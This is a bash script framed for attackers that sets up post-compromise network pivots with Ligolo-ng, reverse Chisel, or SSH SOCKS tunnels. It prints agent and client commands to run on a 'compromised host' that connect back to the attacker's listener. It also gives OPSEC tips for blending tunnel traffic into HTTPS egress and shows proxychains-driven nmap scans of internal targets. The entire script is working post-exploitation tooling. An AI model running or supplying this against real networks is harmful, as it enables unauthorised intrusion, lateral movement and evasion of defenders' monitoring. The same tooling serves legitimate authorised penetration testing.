#!/usr/bin/env bash
# pivot_autoroute.sh - One-shot Ligolo-ng proxy bootstrap + helper for Chisel and
# SSH dynamic pivots. Generates the agent command line for the target and (for
# Ligolo) prepares the TUN interface so 'autoroute' / route add just works.
#
# USAGE:
#   ./pivot_autoroute.sh ligolo  <listen_ip> [listen_port]      # default 11601
#   ./pivot_autoroute.sh chisel  <listen_ip> [listen_port]      # default 8080
#   ./pivot_autoroute.sh ssh     <pivot_user> <pivot_host>      # SOCKS via -D 1080
#
# DEPENDENCIES (attacker side):
#   ligolo-ng proxy binary in PATH (or ./proxy), chisel, ssh, iproute2 (ip), root.
#
# OPSEC: Ligolo agent needs NO admin on target and rides a single TLS connection
#   (yamux-multiplexed) -> low socket count, blends with HTTPS egress if you use
#   -tcp on 443. Chisel wraps SOCKS in HTTP for egress-restricted nets but is
#   noisier (HTTP framing) and has no native multi-pivot session mgmt.

set -euo pipefail
MODE="${1:?mode required: ligolo|chisel|ssh}"

case "$MODE" in
  ligolo)
    LIP="${2:?listen_ip required}"; LPORT="${3:-11601}"
    TUN="ligolo"
    PROXY_BIN="$(command -v ligolo-proxy || echo ./proxy)"
    # Create the TUN interface up-front so 'autoroute' (v0.5+) or manual
    # 'ip route add <subnet> dev ligolo' attaches cleanly.
    if ! ip link show "$TUN" >/dev/null 2>&1; then
        sudo ip tuntap add user "$(whoami)" mode tun "$TUN"
        sudo ip link set "$TUN" up
        echo "[+] created TUN interface '$TUN' (add routes after agent connects:"
        echo "    sudo ip route add <internal_subnet> dev $TUN )"
    fi
    echo "[*] Starting Ligolo-ng proxy on ${LIP}:${LPORT} (self-signed cert)"
    echo
    echo "    AGENT COMMAND (run on compromised host, no admin needed):"
    echo "      # Linux:   ./agent -connect ${LIP}:${LPORT} -ignore-cert -retry"
    echo "      # Windows: agent.exe -connect ${LIP}:${LPORT} -ignore-cert -retry"
    echo
    echo "    In the proxy console after the agent connects:"
    echo "      session        # select the agent"
    echo "      autoroute      # auto-detect subnets & create routes (v0.5+/v0.8 web UI)"
    echo "      start          # start the tunnel"
    echo
    exec "$PROXY_BIN" -selfcert -laddr "0.0.0.0:${LPORT}"
    ;;

  chisel)
    LIP="${2:?listen_ip required}"; LPORT="${3:-8080}"
    echo "[*] Starting Chisel reverse server on :${LPORT}"
    echo
    echo "    CLIENT COMMAND (run on compromised host):"
    echo "      chisel client ${LIP}:${LPORT} R:1080:socks"
    echo
    echo "    Then on attacker, add to /etc/proxychains4.conf:"
    echo "      socks5 127.0.0.1 1080"
    echo "    Usage: proxychains nmap -sT -Pn <internal_target>"
    echo
    exec chisel server --reverse -p "$LPORT"
    ;;

  ssh)
    USER="${2:?pivot_user required}"; HOST="${3:?pivot_host required}"
    echo "[*] SSH dynamic SOCKS pivot via ${USER}@${HOST} on 127.0.0.1:1080"
    echo "    proxychains.conf -> socks5 127.0.0.1 1080"
    echo "    Double pivot: from the pivot, run another -D against the next hop."
    exec ssh -N -D 127.0.0.1:1080 "${USER}@${HOST}"
    ;;

  *)
    echo "[!] unknown mode: $MODE (use ligolo|chisel|ssh)"; exit 1 ;;
esac
